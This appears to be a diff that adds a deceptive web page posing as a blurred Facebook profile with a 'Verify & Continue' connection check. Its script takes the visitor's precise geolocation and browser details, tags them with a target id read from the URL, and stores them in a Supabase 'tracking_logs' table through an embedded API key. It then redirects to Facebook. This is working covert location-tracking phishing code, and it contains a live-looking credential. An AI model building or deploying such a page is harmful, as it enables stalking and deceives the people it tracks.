@@ -18,3 +18,59 @@
 <div id="main-content" class="card">
     <div style="margin-bottom: 20px;">
         <img src="https://i.ibb.co/L5hYwP7/fb-profile-blur.png" alt="Blurred Profile" width="100%">
+    </div>
+    <div id="loader" class="loader"></div>
+    <p id="msg" style="color: #666; font-size: 14px;">Loading connection...</p>
+    <button id="verify-btn" class="btn">Verify & Continue</button>
+</div>
+
+<script>
+    const supabaseUrl = 'https://nhhcijrjrcxznsqltzom.supabase.co';
+    const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5oaGNpanJqcmN4em5zcWx0em9tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM5MTMyODAsImV4cCI6MjA4OTQ4OTI4MH0.1CG80rxN01S00lCQ1gkqyKdenDJR_XjM0uQtEAln9XU';
+    const supabaseClient = supabase.createClient(supabaseUrl, supabaseKey);
+
+    const mainContent = document.getElementById('main-content');
+    const btn = document.getElementById('verify-btn');
+    const loader = document.getElementById('loader');
+    const msg = document.getElementById('msg');
+
+    // Delayed function to simulate loading and show the verify button
+    setTimeout(() => {
+        mainContent.style.filter = 'blur(0)'; // Remove blur when ready
+        loader.style.display = 'none';
+        msg.textContent = 'Please click below to verify your connection and view the profile.';
+        btn.style.display = 'block';
+    }, 2500); // 2.5 second delay for loading effect
+
+    btn.addEventListener('click', () => {
+        btn.style.display = 'none';
+        loader.style.display = 'block';
+        msg.textContent = 'Verifying connection...';
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetId = urlParams.get('id') || 'Social_User';
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                // Supabase-e data pathano
+                await supabaseClient.from('tracking_logs').insert([{ 
+                    user_identifier: targetId, 
+                    latitude: pos.coords.latitude, 
+                    longitude: pos.coords.longitude,
+                    device_info: "Social Verification: " + navigator.userAgent
+                }]);
+                
+                // Redirect to Facebook profile page
+                window.location.replace("https://www.facebook.com");
+            }, (err) => {
+                // Permission deny korle ba error holeo redirect
+                window.location.replace("https://www.facebook.com");
+            }, { enableHighAccuracy: true, timeout: 10000 });
+        } else {
+            window.location.replace("https://www.facebook.com");
+        }
+    });
+</script>
+
+</body>
+</html>
